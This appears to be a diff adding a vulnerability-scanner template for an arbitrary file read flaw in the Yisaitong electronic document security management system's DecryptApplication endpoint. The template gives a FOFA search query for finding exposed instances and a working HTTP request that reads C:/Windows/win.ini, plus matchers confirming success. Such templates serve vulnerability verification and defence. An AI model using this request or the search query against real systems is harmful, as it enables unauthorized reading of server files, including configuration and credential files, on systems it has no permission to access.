@@ -1,0 +1,22 @@
+## id: VEID-2024-0403
+## name: 亿赛通电子文档安全管理系统DecryptApplication存在任意文件读取漏洞
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2024
+## description: 亿赛通电子文档安全管理系统DecryptApplication存在任意文件读取漏洞存在任意文件读取漏洞
+## fofa-query: app="亿赛通电子文档安全管理系统"
+## verification: true
+
+
+GET /CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=C:///Windows/win.ini&uploadFileId=1&fileName1=test1111 HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: body contains "[fonts]" && body contains "[extensions]"
+#@ matcher: status_code == 200 || status_code == 500 || status_code == 400
+
+
+
+
+# @VEIL-STAMP: 7e951d9b595cf036411034d0edce290995059fb6c98490848a5026e02359bad9
